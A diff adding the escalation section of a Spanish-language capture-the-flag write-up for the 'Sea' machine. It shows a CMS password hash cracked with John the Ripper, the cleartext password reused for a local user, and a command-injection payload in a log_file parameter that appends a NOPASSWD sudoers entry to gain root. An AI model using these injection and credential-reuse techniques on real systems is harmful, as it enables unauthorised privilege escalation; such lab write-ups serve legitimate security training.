@@ -195,3 +195,153 @@ El exploit genera una URL que se introducirá en el campo "Website" de la págin
 Tras el submit, se obtiene acceso a la maquina con el usuario www-data.
 
 ## Escalada
+
+### User
+
+Listando los archivos y directorios de la carpeta "/var/www/sea" se observa la carpeta "data":
+
+```bash
+$ cd /var/www/sea
+$ ls
+contact.php
+data
+index.php
+messages
+plugins
+themes
+```
+
+Listando los archivos y directorios de la carpeta "data" se obsera el fichero "database.js":
+
+```bash
+$ cd data
+$ ls
+cache.json
+database.js
+files
+```
+
+Este fichero contiene información de la configuración web, incluida una contraseña encriptada:
+
+```bash
+$ cat database.js
+{
+    "config": {
+        "siteTitle": "Sea",
+        "theme": "bike",
+        "defaultPage": "home",
+        "login": "loginURL",
+        "forceLogout": false,
+        "forceHttps": false,
+        "saveChangesPopup": false,
+        "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",
+        "lastLogins": {
+            "2024\/12\/13 19:30:34": "127.0.0.1",
+            "2024\/12\/13 19:29:04": "127.0.0.1",
+            "2024\/12\/13 19:27:34": "127.0.0.1",
+            "2024\/12\/13 19:25:04": "127.0.0.1",
+            "2024\/12\/13 19:22:34": "127.0.0.1"
+        },
+...
+```
+
+Al desencriptar la contraseña por fuerza bruta con John The Ripper se obtiene la contraseña en texto claro "mychemicalromance":
+
+```bash
+sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+mychemicalromance (?)     
+1g 0:00:00:37 DONE (2024-12-13 20:35) 0.02686g/s 82.21p/s 82.21c/s 82.21C/s midnight1..memories
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+Listando los usuarios del sistema se observan los usuarios "amay" y "geo":
+
+```bash
+amay:x:1000:1000:amay:/home/amay:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+geo:x:1001:1001::/home/geo:/bin/bash
+```
+
+Al intentar la conexión por SSH al usuario "amay" reutilizando la contraseña obtenida de "database.js" se obtiene acceso al equipo con usuario amay y la flag de "user.txt".
+
+```bash
+$ su amay
+Password: mychemicalromance
+whoami
+amay
+```
+
+### Root
+
+Listando directorios no se encuentra nada relevante.
+
+Listando los puertos abiertos se observa el puerto 8080 abierto para localhost:
+
+```bash
+amay@sea:/opt/google/chrome$ netstat -putona
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name     Timer
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
+tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
+```
+
+Para atacar el puerto se crea un port forwarding, llevando el puerto de la maquina Sea al equipo local:
+
+```bash
+ssh -v -N -L 8080:localhost:8080 amay@sea.htb
+```
+
+Al atacar el puerto local 8080 se observa que se trata de una web de un sistema de monitorización:
+
+<!-- ![System Monitor](system_monitor.png) -->
+
+Capturando con burpsuit la petición de "Analyze" se observa que se pasa el nombre del fichero en "log_file":
+
+```bash
+POST / HTTP/1.1
+Host: 127.0.0.1:8081
+Content-Length: 57
+Cache-Control: max-age=0
+Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==
+sec-ch-ua: "Not?A_Brand";v="99", "Chromium";v="130"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Linux"
+Accept-Language: es-ES,es;q=0.9
+Origin: http://127.0.0.1:8081
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: http://127.0.0.1:8081/
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log&analyze_log=
+```
+
+Se testea pasar otros ficheros como "/etc/passwd" y funciona:
+
+<!-- ![/etc/passwd](etc_passwd.png) -->
+
+Se testea a concatenar comandos con "+" en bash y funciona, por lo que se procede a modificar los permisos del usuario "amay" para darle permisos de "sudo":
+
+```bash
+log_file=/etc/passwd+%26%26+echo+"amay+ALL=(ALL)+NOPASSWD:+ALL"+>+/etc/sudoers.d/amay+#&analyze_log=
+```
+
+Lo cual funciona y permite acceder como root con acceso a la flag de root.
+
+```bash
+amay@sea:~$ sudo su
+root@sea:/home/amay#
+```
